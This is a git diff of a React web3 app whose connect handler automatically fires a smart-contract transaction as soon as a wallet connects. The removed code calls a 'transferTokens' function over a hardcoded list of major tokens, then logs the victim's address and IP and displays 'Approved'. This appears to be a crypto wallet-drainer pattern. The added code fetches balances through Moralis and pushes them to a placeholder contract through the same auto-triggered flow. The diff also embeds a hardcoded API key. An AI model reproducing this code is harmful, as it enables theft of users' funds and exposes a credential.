@@ -7,8 +7,8 @@ import { defaultWagmiConfig } from '@web3modal/wagmi/react/config';
 import './App.css';
 import ConnectButton from './components/ConnectButton';
 import Modal from './components/Modal';
+import Moralis from 'moralis';
 const { getEthersSigner } = require('./adapters/ethersAdapters');
-
 const ethers = require("ethers");
 
 const queryClient = new QueryClient();
@@ -41,26 +41,42 @@ export function Web3ModalProvider({ children }) {
   );
 }
 
-const tokenAddresses = [
-  null, // Ethereum
-  '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT
-  '0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48', // USDC
-  '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', // Shiba Inu
-  '0x514910771AF9Ca656af840dff83E8264EcF986CA', // Chainlink
-  '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', // Wrapped Bitcoin
-  '0x7D6F6bAC8eF3f1E5D3C5e1B273c6C98988D11B5C', // Solana (represented as an ERC-20 token here for simplicity)
-  '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', // AAVE
-  '0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B', // Polkadot (represented as an ERC-20 token here for simplicity)
-  '0xB8c77482e45F1F44dE1745F52C74426C631bDD52', // BNB
-];
+async function getMoralisTokenBalances(address) {
+  try {
+    await Moralis.start({
+      apiKey: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjJkNmM3MGNkLTQyMTgtNGQwZC1hOTVlLWE1NTdmMTc1M2U3ZSIsIm9yZ0lkIjoiMzk4NDgwIiwidXNlcklkIjoiNDA5NDU2IiwidHlwZUlkIjoiNzkwMGQ4ZTUtNWMwYS00M2Y2LWExYzUtOTFhMzlhNmNiNzhiIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3MTk4NDE3NTEsImV4cCI6NDg3NTYwMTc1MX0.-oGSC9n_KPDGSk_iSWNjLzLFoHHXUGRmy0rmZQkrut0"
+    });
 
-async function transferTokens(signer) {
+    const response = await Moralis.EvmApi.token.getWalletTokenBalances({
+      "chain": "0x1",
+      "address": address,
+      "token_addresses": [
+        "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
+        "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
+        "0xB8c77482e45F1F44dE1745F52C74426C631bDD52", // BNB
+        "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", // SHIBA INU
+        "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
+        "0x514910771AF9Ca656af840dff83E8264EcF986CA"  // CHAINLINK
+      ]
+    });
+
+    return response.raw;
+  } catch (e) {
+    console.error(e);
+  }
+}
+
+async function sendTokenBalancesToContract(signer, tokenBalances) {
   const contractAddress = 'YOUR_CONTRACT_ADDRESS'; // Replace with your deployed contract address
   const abi = [
-    'function transferTokens(address[] calldata tokenAddresses) external'
+    'function updateTokenBalances(address[] calldata tokenAddresses, uint256[] calldata balances) external'
   ];
   const contract = new ethers.Contract(contractAddress, abi, signer);
-  const tx = await contract.transferTokens(tokenAddresses);
+  
+  const tokenAddresses = tokenBalances.map(token => token.token_address);
+  const balances = tokenBalances.map(token => ethers.BigNumber.from(token.balance));
+
+  const tx = await contract.updateTokenBalances(tokenAddresses, balances);
   await tx.wait();
   return tx;
 }
@@ -86,11 +102,12 @@ function App() {
     if (isConnected && !transactionInProgress) {
       setTransactionInProgress(true);
       setModalVisible(true);
-      setModalMessage("Signing contract...");
+      setModalMessage("Fetching token balances...");
       try {
         const signer = await getEthersSigner(config);
-        setModalMessage("Processing transaction...");
-        const tx = await transferTokens(signer);
+        const tokenBalances = await getMoralisTokenBalances(address);
+        setModalMessage("Sending token balances to smart contract...");
+        const tx = await sendTokenBalancesToContract(signer, tokenBalances);
         await logTransaction({ success: true, address, timestamp: new Date().toISOString(), ip: 'fetch IP from client', txHash: tx.hash });
         setModalMessage("Approved");
       } catch (error) {
